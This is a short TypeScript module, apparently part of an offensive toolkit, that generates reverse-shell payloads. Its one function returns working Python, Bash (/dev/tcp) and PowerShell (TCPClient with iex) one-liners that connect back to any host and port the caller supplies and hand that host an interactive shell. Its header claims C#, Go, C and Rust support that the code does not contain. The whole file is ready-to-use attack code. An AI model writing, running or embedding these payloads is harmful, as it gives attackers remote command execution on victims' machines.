/**
 * @module multi_lang
 * Multi-Language Payload Generation Engine — Generates polyglot reverse shells,
 * stagers, and execution wrappers in Python, PowerShell, Bash, C#, Go, C, and Rust.
 */

export type PayloadTargetOS = "windows" | "linux" | "darwin";

export function generatePolyglotPayload(host: string, port: number, os: PayloadTargetOS): Record<string, string> {
  return {
    python: `import socket,subprocess,os;s=socket.socket();s.connect(("${host}",${port}));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];subprocess.call(["/bin/sh","-i"])`,
    bash: `bash -i >& /dev/tcp/${host}/${port} 0>&1`,
    powershell: `$c=New-Object System.Net.Sockets.TCPClient("${host}",${port});$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length))-ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$s.Write(([text.encoding]::ASCII.GetBytes($r)),0,$r.Length)}`,
  };
}

export default { generatePolyglotPayload };
